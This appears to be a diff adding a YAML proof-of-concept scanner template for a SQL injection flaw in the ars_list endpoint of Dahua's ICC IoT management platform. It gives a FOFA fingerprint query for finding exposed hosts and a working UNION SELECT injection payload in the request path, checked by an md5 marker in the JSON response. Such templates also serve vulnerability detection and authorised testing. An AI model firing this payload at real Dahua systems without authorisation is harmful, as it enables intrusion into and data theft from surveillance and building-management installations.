@@ -1,0 +1,28 @@
+id: poc-yaml-dahua-icc-ars-list-sqli
+info:
+  name: 大华ICC智能物联综合管理平台 ars_list SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 大华ICC智能物联综合管理平台
+  fofa: body="static/qwebchannel.js" && body="/*客户端会小于800*/"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: GET
+  path: /evo-apigw/evo-arsm/1.0.0/ars/list?serviceName='+UNION+ALL+SELECT+NULL,NULL,NULL,CONCAT(0x7e,md5({{.t1}}),0x7e),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--+-
+  expression: 'status_code == 200 &&
+
+    contains(body,"\"success\":true") &&
+
+    contains(body,"\"data\":") &&
+
+    contains(body,t2) &&
+
+    !contains(body,"<") &&
+
+    contains(content_type,"application/json;")
+
+    '
+transport: http
